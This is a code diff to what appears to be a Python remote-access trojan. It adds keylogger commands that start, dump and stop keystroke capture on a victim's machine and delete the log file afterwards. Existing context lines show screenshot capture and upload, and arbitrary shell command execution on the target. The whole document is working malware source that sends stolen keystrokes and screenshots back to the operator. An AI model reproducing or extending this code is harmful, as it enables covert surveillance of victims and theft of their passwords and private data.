@@ -3,6 +3,8 @@ import json
 import subprocess
 import os
 import pyautogui
+import keylogger
+import threading
 
 def send(data):
     jsonData = json.dumps(data)
@@ -77,6 +79,22 @@ def shell():
             screenshot() # Take screenshot
             uploadFile('screen.png') # Send screenshot file
             os.remove('screen.png') # Remove screenshot from target's file system
+
+        elif command[:12] == 'keylog-start':
+            keylog = keylogger.Keylogger()
+            t = threading.Thread(target=keylog.start) # A new thread is initiated so the server can handle other commands while listening for keystrokes
+            t.start()
+            send(f"[+] Keylogger as been started on [{socket.gethostname()}]")
+
+        elif command[:11] == 'keylog-dump':
+            logs = keylog.getLog()
+            send(logs)
+
+        elif command[:11] == 'keylog-stop':
+            keylog.deleteFile()
+            t.join()
+            send(f'''[+] The keylogger session at [{socket.gethostname()}] was ended by the host. Exit with code 0x0
+            [+] Log file deleted from [{keylog.path}] on target [{socket.gethostname()}]''')
 
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
